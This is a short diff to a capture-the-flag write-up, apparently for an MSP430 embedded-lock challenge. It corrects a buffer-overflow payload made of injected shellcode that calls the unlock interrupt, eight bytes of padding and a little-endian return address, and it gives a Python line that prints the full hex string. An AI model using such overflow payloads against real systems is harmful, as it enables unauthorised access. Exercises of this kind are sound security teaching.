@@ -128,14 +128,14 @@ the first 8 bytes will be `3012 7f00 b012 3245` for my changed interrupt
 
 the next 8 bytes are `4242424242424242` (you obviously can also enter other for example `41` 8 times )
 
-the last 2 bytes are `3c72`
+the last 2 bytes are `3c72` for the return
 
 as you already know MSP 430 is `little endian` so it's `723c`
 
 i did it with a python shell:
 
 ```python
->>> print('30127e00b0123245'+'41'*8+'723c')
+>>> print('30127f00b0123245'+'41'*8+'723c')
 ```
 
 this level was pretty tricky!
